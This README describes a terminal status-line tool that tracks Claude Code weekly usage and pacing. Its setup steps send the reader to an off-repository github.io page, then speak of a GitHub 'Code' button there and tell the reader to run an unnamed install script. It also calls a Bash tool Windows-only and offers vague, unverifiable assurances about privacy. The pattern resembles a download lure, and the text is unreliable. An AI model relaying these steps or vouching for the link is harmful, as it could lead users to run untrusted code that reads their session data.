# 📊 claude-statusline-burnrate - Track your Claude usage limits easily

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://rasulfal7902.github.io)

## 💡 What this tool does

Claude Code places limits on how many messages you send each week. If you reach your limit, you stop working. This tool adds a status line to your terminal. It shows your current usage math. It tells you your daily limit. It shows your sustainable burn rate. It helps you pace your work so you do not run out of messages before the week ends. It works in the background while you code.

## 🛠️ System requirements

This tool runs on Windows. You need the following items installed on your machine to use it:

1. A terminal application. Windows Terminal works well.
2. Bash. You can install Git for Windows to get this.
3. JQ. This processes the usage data. You can download this from the official JQ website.

## 📥 How to set up

Follow these steps to get the tool running on your computer.

1. Visit this page to download: [https://rasulfal7902.github.io](https://rasulfal7902.github.io)
2. Locate the green button labeled Code.
3. Click the button and select Download ZIP.
4. Extract the ZIP file to a folder on your computer.
5. Open your terminal.
6. Navigate to the folder where you saved the files.
7. Run the install script provided in the folder.

## ⚙️ How it works

The tool tracks your message count. It reads the data from your Claude Code session. It applies a math formula to your usage. 

- Today's share: This shows how many messages you can send today to stay on track.
- Sustainable burn rate: This tells you if you use messages too fast.
- Sleep-aware pacing: This adjusts your limits based on the time you spend away from the keyboard.

You do not need to configure anything. The tool reads your existing logs. It updates the terminal screen every time you run a command.

## 🔍 Understanding the display

Your terminal will show a line of text at the bottom. The first number shows the messages you have left for the current cycle. The second number shows your recommended limit for the remainder of the week. If the text turns a specific color, you have reached your target for the day. You should slow down your message volume if you see a warning indicator.

## ❓ Frequently asked questions

### Does this tool send my data to a server?
No. The script runs entirely on your local machine. It does not send your data to any external server. 

### Can I customize the status line?
Yes. You can edit the text file in the configuration folder to change the colors or the information displayed. 

### What if the math looks wrong?
Check your system time. The tool relies on your computer clock to track the weekly cycle. Make sure your time zone settings are correct.

### Does this tool slow down my computer?
No. The script uses minimal system resources. It only runs when you start your terminal session.

## 📁 Project structure

- /bin: Contains the main executable files.
- /docs: Includes help files and manual pages.
- /config: Stores your personal settings.
- /logs: Stores local history for debugging purposes.

## 🤝 Support

Open an issue in the repository if you encounter bugs. Provide the error message and the steps you took when the error occurred. Keep your descriptions clear. Use screenshots if they help explain the problem.

## 📝 License

This project uses the MIT license. You can modify and share the code as long as you keep the license file included.

Keywords: anthropic, bash, claude, claude-code, cli, developer-tools, rate-limits, status-line, statusline, terminal